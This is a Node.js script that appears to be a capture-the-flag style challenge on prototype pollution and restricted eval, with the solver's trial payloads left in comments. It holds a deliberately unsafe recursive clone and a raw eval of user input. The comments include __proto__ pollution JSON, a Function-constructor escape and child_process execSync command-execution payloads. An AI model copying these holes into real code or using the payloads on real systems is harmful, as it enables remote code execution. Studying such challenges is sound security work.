#!/usr/local/bin/node
const readline = require("node:readline/promises");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const clone = (target, result = {}) => {
  for (const [key, value] of Object.entries(target)) {
    if (value && typeof value == "object") {
      if (!(key in result)) result[key] = {};
      clone(value, result[key]);
    } else {
      result[key] = value;
    }
  }
  return result;
};

// console.log(Object.getOwnPropertyNames(globalThis));
// console.log(
//   eval(
//     "[]['constructor']['constructor']('return Object.getOwnPropertyNames(this);')()"
//   )
// );

(async () => {
  // Step 1: Prototype Pollution
  const json = (await rl.question("Input JSON: ")).trim();
  console.log(json);
  console.log(JSON.parse(json));
  console.log(clone(JSON.parse(json)));

  // Step 2: JSF**k with 4 characters
  const code = (await rl.question("Input code: ")).trim();
  // if (new Set(code).size > 6) {
  //   console.log("Too many :(");
  //   return;
  // }
  console.log(eval(code));
  // console.log(eval("[]['constructor']['constructor']('return require;')()"));
  // console.log(eval(' require("child_process").execSync("whoami").toString() '));
  // console.log(this);
})().finally(() => rl.close());

// [][[][`[`]]
// { "__proto__": { "[": "readline" } }
// { "__proto__": { "[": true } }
// { "__proto__": { "a": true } } }
// { "__proto__": { "a": function(command) { return require('child_process').execSync(command).toString(); } } }
// { "__proto__": { "a": "function (command) { return require('child_process').execSync(command).toString();" } }

// const payload = { __proto__: { exec: function (command) { return require("child_process").execSync(command).toString(); } } };
